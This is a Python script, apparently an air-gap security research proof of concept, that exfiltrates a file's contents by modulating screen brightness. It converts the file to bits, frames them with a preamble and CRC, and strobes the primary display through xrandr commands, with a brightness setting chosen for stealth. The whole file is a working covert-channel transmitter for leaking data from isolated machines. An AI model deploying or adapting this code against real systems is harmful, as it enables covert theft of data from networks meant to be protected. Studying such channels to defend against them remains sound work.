#!/usr/bin/python

# ---------------------------------------------------
#   __            __
#  /\ \          /\ \__
#  \_\ \     __  \ \ ,_\    __
#  /'_` \  /'__`\ \ \ \/  /'__`\
# /\ \L\ \/\ \L\.\_\ \ \_/\ \L\.\_
# \ \___,_\ \__/.\_\\ \__\ \__/.\_\
#  \/__,_ /\/__/\/_/ \/__/\/__/\/_/
#
#        __                 __
#       /\ \__             /\ \
#   ____\ \ ,_\  _ __   ___\ \ \____     __
#  /',__\\ \ \/ /\`'__\/ __`\ \ '__`\  /'__`\
# /\__, `\\ \ \_\ \ \//\ \L\ \ \ \L\ \/\  __/
# \/\____/ \ \__\\ \_\\ \____/\ \_,__/\ \____\
#  \/___/   \/__/ \/_/ \/___/  \/___/  \/____/
#
#
# Air-gap covert channel using screen brightness
#
# (C) 2021 Rubén Navarro <ruben.nafo@gmail.com>
# ---------------------------------------------------

import sys
import getopt
import os
import subprocess
import time
from crc import CrcCalculator, Crc16


def file2bits(filename):
    """
    Converts the content of a file into an array of bits.

    :param filename: Absolute or relative path of the file.
    :return: File converted into an array of bits (0, 1).
    """
    res = []
    file = open(filename, 'rb')

    print('Converting file to bits...')

    byte = file.read(1)
    while byte:
        res.extend([int(c) for c in '{0:08b}'.format(ord(byte.decode()))])
        byte = file.read(1)

    file.close()

    print('File converted to bits successfully!')

    return res


def frame(data, data_len):
    """
    Packs data into variable lenght frames.

        8 bits       8 bits          data_len bits        16 bits
    ┌────────────┬────────────┬────────────────────────┬───────────┐
    │  01010101  │  DATA LEN  │          DATA          │    CRC    │
    └────────────┴────────────┴────────────────────────┴───────────┘

    :param data: List of bits (0, 1) to be packed.
    :param data_lenght: Size of the frame's data field. Valid values: (0, 255].
    :return: List of lists of bits (0, 1) which each list is data
             packed into a frame. If invalid data_len returns 0.
    """
    if data_len > 0 and data_len < 256:
        print('Packing frames...')
        frames = []

        nframes = len(data)/data_len
        last_frame_len = round((nframes - int(nframes)) * data_len)
        nframes = int(nframes)

        print(('nframes: %s') % (nframes))
        print(('last_frame_len: %s') % (last_frame_len))

        preamble = [0, 1, 0, 1, 0, 1, 0, 1]

        for i in range(nframes + 1):
            if i == nframes:
                data_len = last_frame_len
            if data_len > 0:
                frame_len = [int(c) for c in '{0:08b}'.format(data_len)]

                frame_data = []
                for j in range(data_len):
                    if len(data) > 0:
                        frame_data.append(data.pop(0))

                crc_calculator = CrcCalculator(Crc16.CCITT, True)
                checksum = crc_calculator.calculate_checksum(frame_data)
                frame_crc = [int(c) for c in '{0:016b}'.format(checksum)]

                frames.append(preamble + frame_len + frame_data + frame_crc)

        print('Packing finished!')
        return frames
    else:
        print('data_len value out of range! Valid range: (0, 255]')
        return False


def strobe(data, brightness):
    """
    Encodes data on flashes changing screen brightness.
    Data is encoded using On-off keying.

    :param data: List of bits (0, 1) to be transmitted.
    :param brightness:
        Value between (0, 1) used to set the brightness used to code value 0
        The higher the value, the higher the stealth.
    """
    result = subprocess.Popen(
        'xrandr -q | grep "primary"',
        stdout=subprocess.PIPE,
        shell=True
    )
    (output, err) = result.communicate()
    screen = output.decode().split(' ')[0]

    code_time = 0.033
    on_cmd = ('xrandr --output %s --brightness 1') % (screen)
    off_cmd = ('xrandr --output %s --brightness %s') % (screen, brightness)

    for bit in data:
        start = time.time()
        if bit:
            os.system(on_cmd)
        else:
            os.system(off_cmd)
        exec_time = time.time() - start
        if exec_time < code_time:
            time.sleep(code_time - exec_time)
    os.system(on_cmd)


def main(argv):
    """
    Converts file into an array of bits, packs them into variable lenght frames
    and encodes the result on flashes through screen brightness.

    Options:
        -h
        -f, --filename
        -b, --brightness
        -d, --data_len

    :param argv: Absolute or relative path of the file to encode.
    """
    filename = ''
    brightness = 0.5
    data_len = 255

    try:
        opts, args = getopt.getopt(
            argv, 'h:f:b:d:', ['filename=', 'brightness=', 'data_len='])
    except getopt.GetoptError:
        print('data_strobe.py -f <filename> -b <brightness> -d <data_len>')
        sys.exit()
    for opt, arg in opts:
        if opt == '-h':
            print('data_strobe.py -f <filename> -b <brightness> -d <data_len>')
            sys.exit()
        elif opt in ['-f', '--filename']:
            filename = arg
        elif opt in ['-b', '--brightness']:
            brightness = arg
        elif opt in ['-d', '--data_len']:
            data_len = int(arg)

    if not filename:
        print('Filename required!')
        print('data_strobe.py -f <filename> -b <brightness> -d <data_len>')
        sys.exit()

    start = time.time()

    raw_data = file2bits(filename)
    frames = frame(raw_data, data_len)

    print('Starting tranmission...')
    main_start = time.time()

    if frames:
        for f in frames:
            strobe(f, brightness)
    else:
        print('Execution failed!')
        sys.exit()

    print('Transmission finished!')
    print(
        ('Total transmission time: %s seconds') %
        (str(time.time() - main_start)))

    print('Execution finished!')
    print(('Total execution time: %s seconds') % (str(time.time() - start)))


if __name__ == "__main__":
    main(sys.argv[1:])

